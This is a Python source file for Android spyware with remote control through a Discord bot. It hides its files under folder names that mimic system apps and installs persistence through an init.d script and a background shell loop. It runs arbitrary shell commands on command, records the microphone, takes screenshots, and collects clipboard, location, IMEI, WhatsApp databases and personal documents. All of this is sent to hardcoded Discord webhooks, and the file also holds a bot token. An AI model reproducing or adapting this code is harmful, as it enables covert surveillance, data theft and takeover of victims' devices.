#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import socket
import platform
import json
import hashlib
import threading
import asyncio
import random
import string
import re
import uuid
import base64
from datetime import datetime, timedelta
import logging
import subprocess
import zipfile
import tempfile
import shutil

# Android-specific imports
try:
    import jnius
    from android import mActivity
    from android.permissions import request_permissions, Permission
    JNIUS_AVAILABLE = True
except ImportError:
    JNIUS_AVAILABLE = False

try:
    from kivy.utils import platform as kivy_platform
    KIVY_AVAILABLE = True
except ImportError:
    KIVY_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# ====== GLOBAL CONSTANTS & HELPERS ======
def get_android_storage_path():
    """Get Android storage path"""
    try:
        if JNIUS_AVAILABLE:
            # Use Android Environment to get external storage
            Environment = jnius.autoclass('android.os.Environment')
            context = mActivity.getApplicationContext()
            files_dir = context.getFilesDir()
            return str(files_dir.toString())
        else:
            # Fallback paths for Android
            paths = [
                '/sdcard/',
                '/storage/emulated/0/',
                '/storage/sdcard0/',
                os.path.expanduser('~'),
            ]
            for path in paths:
                if os.path.exists(path):
                    return path
            return '/data/data/'
    except Exception:
        return '/data/data/'

FOLDER_OUTPUT = os.path.join(get_android_storage_path(), "Android", "data", "com.android.settings", "cache")
os.makedirs(FOLDER_OUTPUT, exist_ok=True)

def request_android_permissions():
    """Request necessary Android permissions"""
    if not JNIUS_AVAILABLE:
        return False
        
    try:
        permissions = [
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.RECORD_AUDIO,
            Permission.CAMERA,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.ACCESS_WIFI_STATE,
            Permission.ACCESS_NETWORK_STATE,
            Permission.INTERNET,
            Permission.READ_PHONE_STATE,
        ]
        request_permissions(permissions)
        return True
    except Exception:
        return False

def write_log(text):
    """Write log file"""
    try:
        log_file = os.path.join(FOLDER_OUTPUT, "activity.log")
        with open(log_file, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {text}\n")
    except Exception:
        pass

# ========== CONFIGURATION ========== #
class Config:
    # Discord Configuration
    BOT_TOKEN = "MTM5OTM3MzY1ODk5NjM0Njg4Mg.GXaiDe.nVOteU7iTqujqwwdXSaNJTN4cDeOvBDoRtBMTY"
    CONTROL_CHANNEL_ID = 1401746685566259230
    ADMIN_IDS = [1103234685544448091]
    
    # Webhooks
    WEBHOOKS = {
        'passwords': "https://discord.com/api/webhooks/1399661377655935017/XUcL5jb_bZb5NoZuKeOUL2mnbYrJq4qpILWvSxFX2hiJSVFU8TkKeyGDmggcBGPNbR3v",
        'system_info': "https://discord.com/api/webhooks/1399661564289618050/m0UmKlmsxNHDiqpnXJUKY3Y2oAQjOHhrH_Hs46goGKeYgKeFqaI35XryDJkqTAcNsweo",
        'files': "https://discord.com/api/webhooks/1399661690005618718/LfiDvMQoldSdBDuMRiSnkSTzz28IhyCkvmWaKtpP0RxPPmpprOQe87KfFdeRHz66uRjh",
        'screenshots': "https://discord.com/api/webhooks/1399661941894545449/drsN1hsbj95TxFoIwmKlu6Srqh3by5mukCz-ogotbU-pU_ceBFAQNHtn9MW0tLJAkRCq",
        'microphone': "https://discord.com/api/webhooks/1399662045325955083/7GfnXN0i4kptfcgjUhsgd4S5tnPOJ3j3qCPmE0IhobHrXReXakWdJuEKhKKxtvqqVrqc", 
        'commands': "https://discord.com/api/webhooks/1401746714913804338/Po-s0bykvkqvoZ962wnLHdUAdz4VpqDnDrCed9OKZk20812GcLCti9tlDUf16J8PgYez",
        'devices': "https://discord.com/api/webhooks/1400368027001819238/-4NYXpVt-8Rw2ZIsQ0vj-KQR7h7no7HOUxg4CekMd6ihVaBuW7mOSVFay1hZZqrEbtP7", 
        'notifications': "https://discord.com/api/webhooks/1400368027001819238/-4NYXpVt-8Rw2ZIsQ0vj-KQR7h7no7HOUxg4CekMd6ihVaBuW7mOSVFay1hZZqrEbtP7",
        'whatsapp': "https://discord.com/api/webhooks/1401847601229201478/qlFCTdtSm102zFaAWsvobcClbMSPdJpJ2lMRpv4zZlLLrh8COjnz05Zs-5NuUh_5qXmg",
        'screen_recordings': "https://discord.com/api/webhooks/1399661941894545449/drsN1hsbj95TxFoIwmKlu6Srqh3by5mukCz-ogotbU-pU_ceBFAQNHtn9MW0tLJAkRCq"
    }

    # Android-specific settings
    STEALTH_MODE = True  
    DEBUG_MODE = False
    MAX_FILE_SIZE = 7 * 1024 * 1024  # 7MB
    USER_AGENT = "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36"
    MIC_DURATION = 10  # Seconds
    MIC_SAMPLE_RATE = 44100  # Hz
    SCREENSHOT_INTERVAL = 300  # 5 minutes
    COMMAND_CHECK_INTERVAL = 5  # Seconds
    
    # Persistence Settings for Android
    PERSISTENCE_DIR = os.path.join(get_android_storage_path(), "Android", "data", "com.android.systemui", "cache")
    PERSISTENCE_PATH = os.path.join(PERSISTENCE_DIR, "system_service.apk")
    
    # Device identification
    DEVICE_ID = hashlib.md5(f"{platform.node()}{get_android_username()}".encode()).hexdigest()[:8]
    DEVICE_ALIAS = f"{get_device_model()}-{get_android_username()}"
    VERSION = "1.0-android"

def get_android_username():
    """Get Android username"""
    try:
        if JNIUS_AVAILABLE:
            context = mActivity.getApplicationContext()
            user_manager = context.getSystemService("user")
            user_handle = user_manager.getUserHandle()
            return f"user_{user_handle}"
        return "android_user"
    except Exception:
        return "android_user"

def get_device_model():
    """Get Android device model"""
    try:
        if JNIUS_AVAILABLE:
            Build = jnius.autoclass('android.os.Build')
            return f"{Build.MANUFACTURER}_{Build.MODEL}"
        return platform.node() or "Android_Device"
    except Exception:
        return "Android_Device"

# ========== ANDROID UTILITIES ========== #
class AndroidUtils:
    @staticmethod
    def generate_random_string(length=8):
        """Generate a random string for filenames."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    @staticmethod
    def is_rooted():
        """Check if device is rooted"""
        try:
            # Check common root binaries
            root_binaries = [
                '/system/bin/su',
                '/system/xbin/su',
                '/sbin/su',
                '/system/su',
                '/system/bin/.ext/.su'
            ]
            return any(os.path.exists(binary) for binary in root_binaries)
        except Exception:
            return False

    @staticmethod
    def get_android_info():
        """Get detailed Android device information"""
        try:
            info = {
                "Platform": "Android",
                "Android_Version": platform.release(),
                "Device_Model": get_device_model(),
                "Device_ID": Config.DEVICE_ID,
                "Device_Alias": Config.DEVICE_ALIAS,
                "Username": get_android_username(),
                "Is_Rooted": AndroidUtils.is_rooted(),
                "Storage_Path": get_android_storage_path(),
                "Architecture": platform.machine(),
                "Timestamp": datetime.now().isoformat()
            }
            
            # Add additional Android-specific info if jnius is available
            if JNIUS_AVAILABLE:
                try:
                    Build = jnius.autoclass('android.os.Build')
                    TelephonyManager = jnius.autoclass('android.telephony.TelephonyManager')
                    context = mActivity.getApplicationContext()
                    
                    telephony_manager = context.getSystemService("phone")
                    wifi_manager = context.getSystemService("wifi")
                    
                    info.update({
                        "Brand": Build.BRAND,
                        "Manufacturer": Build.MANUFACTURER,
                        "Product": Build.PRODUCT,
                        "Device": Build.DEVICE,
                        "Hardware": Build.HARDWARE,
                        "Serial": Build.SERIAL,
                        "SDK_Version": Build.VERSION.SDK_INT,
                    })
                    
                    # Get IMEI if permission available
                    try:
                        if telephony_manager:
                            info["IMEI"] = telephony_manager.getDeviceId()
                    except Exception:
                        info["IMEI"] = "Permission denied"
                        
                except Exception as e:
                    info["Android_Details_Error"] = str(e)
            
            return info
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def execute_command(cmd, timeout=30):
        """Execute system command on Android"""
        try:
            # Use sh shell for Android
            full_cmd = f"sh -c '{cmd}'"
            
            result = subprocess.run(
                full_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                executable='/system/bin/sh'
            )
            
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "command": cmd,
                "timestamp": datetime.now().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Command timed out", "command": cmd, "timestamp": datetime.now().isoformat()}
        except Exception as e:
            return {"success": False, "error": str(e), "command": cmd, "timestamp": datetime.now().isoformat()}

    @staticmethod
    def take_screenshot():
        """Take screenshot on Android (requires root or special permissions)"""
        try:
            # Method 1: Using screencap command (requires root)
            if AndroidUtils.is_rooted():
                filename = os.path.join(FOLDER_OUTPUT, f"screenshot_{AndroidUtils.generate_random_string()}.png")
                result = AndroidUtils.execute_command(f"screencap -p > {filename}")
                if result['success'] and os.path.exists(filename):
                    return filename
            
            # Method 2: Using Android API (requires specific permissions)
            if JNIUS_AVAILABLE:
                try:
                    # This would require additional setup and permissions
                    write_log("Screenshot via API not implemented")
                except Exception:
                    pass
            
            return None
        except Exception:
            return None

    @staticmethod
    def get_network_info():
        """Get network information on Android"""
        try:
            network_info = []
            
            # Get IP address information
            result = AndroidUtils.execute_command("ip addr show")
            if result['success']:
                lines = result['stdout'].split('\n')
                for line in lines:
                    if 'inet ' in line and '127.0.0.1' not in line:
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            ip = parts[1].split('/')[0]
                            interface = parts[-1]
                            network_info.append({
                                'interface': interface,
                                'ip': ip,
                                'type': 'local'
                            })
            
            # Get WiFi information if available
            if JNIUS_AVAILABLE:
                try:
                    WifiManager = jnius.autoclass('android.net.wifi.WifiManager')
                    context = mActivity.getApplicationContext()
                    wifi_manager = context.getSystemService("wifi")
                    
                    if wifi_manager and wifi_manager.isWifiEnabled():
                        wifi_info = wifi_manager.getConnectionInfo()
                        network_info.append({
                            'interface': 'wlan0',
                            'ssid': wifi_info.getSSID(),
                            'bssid': wifi_info.getBSSID(),
                            'signal_strength': wifi_info.getRssi(),
                            'type': 'wifi'
                        })
                except Exception:
                    pass
            
            return network_info
        except Exception as e:
            return []

    @staticmethod
    def get_installed_apps():
        """Get list of installed applications"""
        try:
            apps = []
            
            # Method 1: Using pm command
            result = AndroidUtils.execute_command("pm list packages -f")
            if result['success']:
                for line in result['stdout'].split('\n'):
                    if line.startswith('package:'):
                        parts = line.split('=')
                        if len(parts) == 2:
                            app_path = parts[0].replace('package:', '')
                            package_name = parts[1]
                            apps.append({
                                'package': package_name,
                                'path': app_path
                            })
            
            return apps
        except Exception:
            return []

    @staticmethod
    def get_sms_messages():
        """Get SMS messages (requires READ_SMS permission)"""
        try:
            if not JNIUS_AVAILABLE:
                return []
                
            # This requires READ_SMS permission and specific ContentResolver setup
            # Implementation would vary based on Android version
            write_log("SMS extraction requires specific permissions and setup")
            return []
        except Exception:
            return []

    @staticmethod
    def get_contacts():
        """Get contacts (requires READ_CONTACTS permission)"""
        try:
            if not JNIUS_AVAILABLE:
                return []
                
            # This requires READ_CONTACTS permission
            write_log("Contacts extraction requires specific permissions")
            return []
        except Exception:
            return []

    @staticmethod
    def get_location_info():
        """Get location information on Android"""
        try:
            location_info = {}
            
            if JNIUS_AVAILABLE:
                try:
                    LocationManager = jnius.autoclass('android.location.LocationManager')
                    context = mActivity.getApplicationContext()
                    location_manager = context.getSystemService("location")
                    
                    # Check location providers
                    providers = location_manager.getProviders(True)
                    location_info['available_providers'] = list(providers) if providers else []
                    
                    # Try to get last known location
                    for provider in ['gps', 'network', 'passive']:
                        try:
                            location = location_manager.getLastKnownLocation(provider)
                            if location:
                                location_info.update({
                                    'latitude': location.getLatitude(),
                                    'longitude': location.getLongitude(),
                                    'accuracy': location.getAccuracy(),
                                    'provider': provider,
                                    'timestamp': location.getTime()
                                })
                                break
                        except Exception:
                            continue
                            
                except Exception as e:
                    location_info['location_error'] = str(e)
            
            # Fallback to IP-based location
            if 'latitude' not in location_info and REQUESTS_AVAILABLE:
                try:
                    response = requests.get('http://ip-api.com/json/', timeout=5)
                    if response.status_code == 200:
                        ip_data = response.json()
                        if ip_data.get('status') == 'success':
                            location_info.update({
                                'latitude': ip_data.get('lat'),
                                'longitude': ip_data.get('lon'),
                                'city': ip_data.get('city'),
                                'country': ip_data.get('country'),
                                'isp': ip_data.get('isp'),
                                'provider': 'ip_geolocation'
                            })
                except Exception:
                    pass
            
            location_info['timestamp'] = datetime.now().isoformat()
            return location_info
            
        except Exception as e:
            return {'error': str(e), 'timestamp': datetime.now().isoformat()}

# ========== ANDROID PERSISTENCE ========== #
class AndroidPersistence:
    @staticmethod
    def install():
        """Install persistence on Android"""
        try:
            # Create hidden directory
            if not os.path.exists(Config.PERSISTENCE_DIR):
                os.makedirs(Config.PERSISTENCE_DIR, exist_ok=True)
            
            # Copy current script to persistence location
            current_script = sys.argv[0]
            if os.path.exists(current_script):
                shutil.copy2(current_script, Config.PERSISTENCE_PATH)
                
                # Make executable
                os.chmod(Config.PERSISTENCE_PATH, 0o755)
            
            # Create startup script or service
            AndroidPersistence._create_startup_mechanism()
            
            return True
        except Exception:
            return False

    @staticmethod
    def _create_startup_mechanism():
        """Create startup mechanism for Android"""
        try:
            # Method 1: Create init.d script (requires root)
            if AndroidUtils.is_rooted():
                init_script = """
#!/system/bin/sh
# Android persistence script
while true; do
    python3 {script_path}
    sleep 60
done
""".format(script_path=Config.PERSISTENCE_PATH)
                
                init_path = "/system/etc/init.d/99systemservice"
                try:
                    with open(init_path, 'w') as f:
                        f.write(init_script)
                    os.chmod(init_path, 0o755)
                except Exception:
                    pass
            
            # Method 2: Create background service via app
            service_script = os.path.join(Config.PERSISTENCE_DIR, "service.sh")
            with open(service_script, 'w') as f:
                f.write(f"""#!/system/bin/sh
while true; do
    python3 {Config.PERSISTENCE_PATH}
    sleep 30
done
""")
            os.chmod(service_script, 0o755)
            
            # Try to start service
            AndroidUtils.execute_command(f"nohup sh {service_script} > /dev/null 2>&1 &")
            
            return True
        except Exception:
            return False

# ========== ANDROID DATA EXTRACTION ========== #
class AndroidDataExtractor:
    @staticmethod
    def get_whatsapp_data():
        """Extract WhatsApp data from Android"""
        try:
            whatsapp_data = {}
            
            # Common WhatsApp paths on Android
            whatsapp_paths = [
                "/sdcard/WhatsApp/",
                "/storage/emulated/0/WhatsApp/",
                "/sdcard/Android/media/com.whatsapp/",
                "/storage/emulated/0/Android/media/com.whatsapp/",
            ]
            
            for base_path in whatsapp_paths:
                if not os.path.exists(base_path):
                    continue
                
                # Find databases and media files
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        file_ext = os.path.splitext(file)[1].lower()
                        
                        if file.endswith('.db') and 'msgstore' in file.lower():
                            whatsapp_data.setdefault('databases', []).append({
                                'path': file_path,
                                'size': os.path.getsize(file_path),
                                'modified': os.path.getmtime(file_path)
                            })
                        elif file_ext in ['.jpg', '.jpeg', '.png', '.mp4', '.3gp', '.ogg']:
                            whatsapp_data.setdefault('media', []).append({
                                'path': file_path,
                                'size': os.path.getsize(file_path),
                                'type': file_ext
                            })
            
            return whatsapp_data
        except Exception:
            return {}

    @staticmethod
    def get_browser_data():
        """Extract browser data from Android browsers"""
        try:
            browser_data = {}
            
            # Common browser packages
            browsers = {
                'chrome': 'com.android.chrome',
                'firefox': 'org.mozilla.firefox',
                'samsung': 'com.sec.android.app.sbrowser',
                'opera': 'com.opera.browser'
            }
            
            for browser_name, package in browsers.items():
                data_path = f"/data/data/{package}"
                if os.path.exists(data_path):
                    browser_data[browser_name] = {
                        'path': data_path,
                        'exists': True
                    }
            
            return browser_data
        except Exception:
            return {}

    @staticmethod
    def collect_android_data():
        """Collect comprehensive Android data"""
        return {
            'system_info': AndroidUtils.get_android_info(),
            'network_info': AndroidUtils.get_network_info(),
            'installed_apps': AndroidUtils.get_installed_apps(),
            'location_info': AndroidUtils.get_location_info(),
            'whatsapp_data': AndroidDataExtractor.get_whatsapp_data(),
            'browser_data': AndroidDataExtractor.get_browser_data(),
            'timestamp': datetime.now().isoformat()
        }

# ========== ANDROID SURVEILLANCE ========== #
class AndroidSurveillance:
    @staticmethod
    def record_audio(duration=Config.MIC_DURATION):
        """Record audio on Android"""
        try:
            filename = os.path.join(FOLDER_OUTPUT, f"audio_{AndroidUtils.generate_random_string()}.wav")
            
            # Use Android's AudioRecord API via jnius
            if JNIUS_AVAILABLE:
                try:
                    AudioRecord = jnius.autoclass('android.media.AudioRecord')
                    MediaRecorder = jnius.autoclass('android.media.MediaRecorder')
                    
                    # This would require detailed implementation
                    write_log("Audio recording via API requires specific implementation")
                    return None
                except Exception:
                    pass
            
            # Fallback: Try using termux-api if available
            result = AndroidUtils.execute_command(f"termux-microphone-record -d {duration} -f {filename}")
            if result['success'] and os.path.exists(filename):
                return filename
            
            return None
        except Exception:
            return None

    @staticmethod
    def get_clipboard():
        """Get clipboard contents on Android"""
        try:
            if JNIUS_AVAILABLE:
                try:
                    ClipboardManager = jnius.autoclass('android.content.ClipboardManager')
                    context = mActivity.getApplicationContext()
                    clipboard = context.getSystemService("clipboard")
                    
                    if clipboard.hasPrimaryClip():
                        clip_data = clipboard.getPrimaryClip()
                        if clip_data.getItemCount() > 0:
                            return str(clip_data.getItemAt(0).getText())
                except Exception:
                    pass
            
            return None
        except Exception:
            return None

# ========== DATA EXFILTRATION ========== #
class AndroidExfiltrator:
    @staticmethod
    def upload_to_webhook(file_path=None, webhook_url=None, content=None):
        """Upload file or content to Discord webhook"""
        if not REQUESTS_AVAILABLE:
            return False
            
        try:
            if content:
                payload = {"content": json.dumps(content, indent=2)}
                requests.post(
                    webhook_url or Config.WEBHOOKS['commands'],
                    data=payload,
                    headers={"User-Agent": Config.USER_AGENT},
                    timeout=30
                )
            elif file_path and os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    requests.post(
                        webhook_url or Config.WEBHOOKS['commands'],
                        files={"file": f},
                        headers={"User-Agent": Config.USER_AGENT},
                        timeout=60
                    )
                try:
                    os.remove(file_path)
                except Exception:
                    pass
            return True
        except Exception:
            return False

    @staticmethod
    def send_notification(message):
        """Send notification to Discord"""
        if not REQUESTS_AVAILABLE:
            return
            
        try:
            payload = {
                "content": f"[{Config.DEVICE_ALIAS}] {message}",
                "embeds": [{
                    "title": "Android Device Notification",
                    "description": message,
                    "color": 0xff0000,
                    "fields": [
                        {"name": "Device", "value": Config.DEVICE_ALIAS, "inline": True},
                        {"name": "ID", "value": Config.DEVICE_ID, "inline": True},
                        {"name": "Time", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False}
                    ]
                }]
            }
            requests.post(
                Config.WEBHOOKS['notifications'],
                json=payload,
                headers={"User-Agent": Config.USER_AGENT},
                timeout=30
            )
        except Exception:
            pass

# ========== DISCORD BOT (ANDROID COMPATIBLE) ========== #
if DISCORD_AVAILABLE:
    class AndroidDiscordBot(commands.Bot):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.last_command_time = datetime.now()
            self._command_handlers = {
                'help': self._handle_help,
                'sysinfo': self._handle_sysinfo,
                'screenshot': self._handle_screenshot,
                'mic': self._handle_mic,
                'apps': self._handle_apps,
                'files': self._handle_files,
                'cmd': self._handle_cmd,
                'clipboard': self._handle_clipboard,
                'location': self._handle_location,
                'whatsapp': self._handle_whatsapp,
                'browsers': self._handle_browsers,
                'network': self._handle_network,
                'kill': self._handle_kill,
            }

        async def on_ready(self):
            # Silent connection
            AndroidExfiltrator.send_notification("Android device connected and ready")

        async def on_message(self, message):
            if message.author == self.user or message.author.id not in Config.ADMIN_IDS:
                return

            if message.channel.id != Config.CONTROL_CHANNEL_ID:
                return

            if message.content.startswith('!'):
                await self._process_command(message)

        async def _process_command(self, message):
            try:
                parts = message.content.split()
                if not parts:
                    return

                command = parts[0][1:].lower()
                args = parts[1:] if len(parts) > 1 else []

                handler = self._command_handlers.get(command)
                if handler:
                    try:
                        response = await handler(args)
                        if response:
                            device_info = f"[{Config.DEVICE_ID}] "
                            await message.channel.send(device_info + str(response)[:2000])
                    except Exception as handler_error:
                        error_msg = f"[{Config.DEVICE_ID}] Handler error: {str(handler_error)}"
                        await message.channel.send(error_msg)
                else:
                    await message.channel.send(f"[{Config.DEVICE_ID}] Unknown command. Type !help for available commands.")
                    
            except Exception as e:
                error_msg = f"[{Config.DEVICE_ID}] Error executing command: {str(e)}"
                await message.channel.send(error_msg)

        async def _handle_help(self, args):
            return """Available Android Commands:
!help - Show this message
!sysinfo - Get Android system information
!screenshot - Take screenshot (requires root)
!mic [duration] - Record microphone
!apps - List installed applications
!files - Collect interesting files
!cmd <command> - Execute Android shell command
!clipboard - Get clipboard contents
!location - Get device location
!whatsapp - Extract WhatsApp data
!browsers - List installed browsers
!network - Get network information
!kill - Terminate the bot"""

        async def _handle_sysinfo(self, args):
            info = AndroidUtils.get_android_info()
            AndroidExfiltrator.upload_to_webhook(content=info, webhook_url=Config.WEBHOOKS['system_info'])
            return "Android system information collected and sent."

        async def _handle_screenshot(self, args):
            screenshot = AndroidUtils.take_screenshot()
            if screenshot:
                AndroidExfiltrator.upload_to_webhook(screenshot, Config.WEBHOOKS['screenshots'])
                return "Screenshot captured and sent."
            return "Failed to capture screenshot. Root may be required."

        async def _handle_mic(self, args):
            duration = int(args[0]) if args and args[0].isdigit() else Config.MIC_DURATION
            audio = AndroidSurveillance.record_audio(duration)
            if audio:
                AndroidExfiltrator.upload_to_webhook(audio, Config.WEBHOOKS['microphone'])
                return f"Microphone recorded for {duration} seconds and sent."
            return "Microphone recording failed or not supported."

        async def _handle_apps(self, args):
            apps = AndroidUtils.get_installed_apps()
            if apps:
                AndroidExfiltrator.upload_to_webhook(
                    content={
                        "installed_apps": apps[:50],  # Limit to first 50
                        "total_apps": len(apps),
                        "device_id": Config.DEVICE_ID
                    },
                    webhook_url=Config.WEBHOOKS['system_info']
                )
                return f"Found {len(apps)} installed apps. Sent first 50 to webhook."
            return "No installed apps found or failed to list apps."

        async def _handle_files(self, args):
            try:
                # Collect various file types
                collected_files = []
                
                # Common Android file locations
                search_paths = [
                    "/sdcard/Download/",
                    "/sdcard/Documents/",
                    "/sdcard/Pictures/",
                    "/sdcard/DCIM/",
                    "/sdcard/Movies/",
                    "/sdcard/Music/",
                ]
                
                interesting_extensions = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt', '.jpg', '.jpeg', '.png']
                
                for search_path in search_paths:
                    if not os.path.exists(search_path):
                        continue
                        
                    for root, dirs, files in os.walk(search_path):
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in interesting_extensions):
                                file_path = os.path.join(root, file)
                                try:
                                    collected_files.append({
                                        "path": file_path,
                                        "size": os.path.getsize(file_path),
                                        "modified": os.path.getmtime(file_path)
                                    })
                                except Exception:
                                    continue
                
                if collected_files:
                    # Create zip file
                    zip_path = os.path.join(FOLDER_OUTPUT, f"android_files_{AndroidUtils.generate_random_string()}.zip")
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for file_info in collected_files[:10]:  # Limit files in zip
                            try:
                                zipf.write(file_info['path'], os.path.basename(file_info['path']))
                            except Exception:
                                continue
                    
                    if os.path.exists(zip_path):
                        AndroidExfiltrator.upload_to_webhook(zip_path, Config.WEBHOOKS['files'])
                        os.remove(zip_path)
                    
                    AndroidExfiltrator.upload_to_webhook(
                        content={
                            "file_collection_report": {
                                "total_files_found": len(collected_files),
                                "files_in_zip": min(10, len(collected_files)),
                                "device_id": Config.DEVICE_ID
                            }
                        },
                        webhook_url=Config.WEBHOOKS['files']
                    )
                    return f"File collection completed. Found {len(collected_files)} files."
                
                return "No interesting files found."
            except Exception as e:
                return f"File collection failed: {str(e)}"

        async def _handle_cmd(self, args):
            if not args:
                return "Please provide a command to execute. Usage: !cmd <command>"
                
            cmd = ' '.join(args)
            result = AndroidUtils.execute_command(cmd)
            
            AndroidExfiltrator.upload_to_webhook(content=result, webhook_url=Config.WEBHOOKS['commands'])
            
            if result.get('success', False):
                stdout = result.get('stdout', '')[:500]  # Limit output
                return f"Command executed successfully:\n{stdout}"
            else:
                return f"Command failed: {result.get('error', 'Unknown error')}"

        async def _handle_clipboard(self, args):
            clipboard = AndroidSurveillance.get_clipboard()
            if clipboard:
                AndroidExfiltrator.upload_to_webhook(
                    content={
                        "clipboard": clipboard,
                        "device_id": Config.DEVICE_ID,
                        "timestamp": datetime.now().isoformat()
                    }, 
                    webhook_url=Config.WEBHOOKS['commands']
                )
                return "Clipboard contents sent."
            return "Clipboard is empty or access denied."

        async def _handle_location(self, args):
            location_info = AndroidUtils.get_location_info()
            AndroidExfiltrator.upload_to_webhook(
                content={
                    "location_data": location_info,
                    "device_id": Config.DEVICE_ID,
                    "timestamp": datetime.now().isoformat()
                },
                webhook_url=Config.WEBHOOKS['system_info']
            )
            
            if 'error' not in location_info:
                summary = "📍 Location Information:\n"
                if 'latitude' in location_info:
                    summary += f"Latitude: {location_info['latitude']}\n"
                    summary += f"Longitude: {location_info['longitude']}\n"
                    summary += f"Accuracy: {location_info.get('accuracy', 'N/A')}\n"
                    summary += f"Provider: {location_info.get('provider', 'N/A')}\n"
                if 'city' in location_info:
                    summary += f"City: {location_info['city']}\n"
                    summary += f"Country: {location_info['country']}\n"
                return summary
            return "Failed to get location information."

        async def _handle_whatsapp(self, args):
            whatsapp_data = AndroidDataExtractor.get_whatsapp_data()
            if whatsapp_data:
                AndroidExfiltrator.upload_to_webhook(
                    content={
                        "whatsapp_data": whatsapp_data,
                        "device_id": Config.DEVICE_ID,
                        "timestamp": datetime.now().isoformat()
                    },
                    webhook_url=Config.WEBHOOKS['whatsapp']
                )
                
                summary = "WhatsApp Data Found:\n"
                if 'databases' in whatsapp_data:
                    summary += f"- Databases: {len(whatsapp_data['databases'])}\n"
                if 'media' in whatsapp_data:
                    summary += f"- Media files: {len(whatsapp_data['media'])}\n"
                
                return summary
            return "No WhatsApp data found."

        async def _handle_browsers(self, args):
            browser_data = AndroidDataExtractor.get_browser_data()
            if browser_data:
                AndroidExfiltrator.upload_to_webhook(
                    content={
                        "browser_data": browser_data,
                        "device_id": Config.DEVICE_ID,
                        "timestamp": datetime.now().isoformat()
                    },
                    webhook_url=Config.WEBHOOKS['system_info']
                )
                
                browsers_found = list(browser_data.keys())
                return f"Found browsers: {', '.join(browsers_found) if browsers_found else 'None'}"
            return "No browser data found."

        async def _handle_network(self, args):
            network_info = AndroidUtils.get_network_info()
            if network_info:
                AndroidExfiltrator.upload_to_webhook(
                    content={
                        "network_info": network_info,
                        "device_id": Config.DEVICE_ID,
                        "timestamp": datetime.now().isoformat()
                    },
                    webhook_url=Config.WEBHOOKS['system_info']
                )
                
                summary = "Network Information:\n"
                for net in network_info:
                    if net['type'] == 'local':
                        summary += f"Interface: {net['interface']}, IP: {net['ip']}\n"
                    elif net['type'] == 'wifi':
                        summary += f"WiFi: {net.get('ssid', 'Unknown')}, Signal: {net.get('signal_strength', 'N/A')}\n"
                
                return summary
            return "No network information available."

        async def _handle_kill(self, args):
            response = "Android bot shutting down..."
            await self.close()
            os._exit(0)
            return response

# ========== MAIN EXECUTION ========== #
def run_android_bot():
    if not DISCORD_AVAILABLE:
        write_log("Discord library not available")
        return
        
    intents = discord.Intents.default()
    intents.messages = True
    intents.message_content = True
    
    bot = AndroidDiscordBot(command_prefix='!', intents=intents)
    
    try:
        bot.run(Config.BOT_TOKEN)
    except Exception as e:
        write_log(f"Bot error: {str(e)}")

def main():
    # Request Android permissions
    if JNIUS_AVAILABLE:
        request_android_permissions()
    
    # Install persistence
    AndroidPersistence.install()
    
    # Start periodic tasks
    def periodic_tasks():
        while True:
            try:
                # Collect and send system info periodically
                system_info = AndroidUtils.get_android_info()
                AndroidExfiltrator.upload_to_webhook(
                    content={
                        "periodic_check": system_info,
                        "device_id": Config.DEVICE_ID,
                        "timestamp": datetime.now().isoformat()
                    },
                    webhook_url=Config.WEBHOOKS['system_info']
                )
                
                time.sleep(300)  # Run every 5 minutes
            except Exception as e:
                time.sleep(60)
    
    periodic_thread = threading.Thread(target=periodic_tasks)
    periodic_thread.daemon = True
    periodic_thread.start()
    
    # Start Discord bot
    while True:
        try:
            if DISCORD_AVAILABLE:
                run_android_bot()
            else:
                write_log("Discord not available, running in background mode")
                time.sleep(60)
        except Exception as e:
            write_log(f"Main loop error: {str(e)}")
            time.sleep(60)

if __name__ == "__main__":
    main()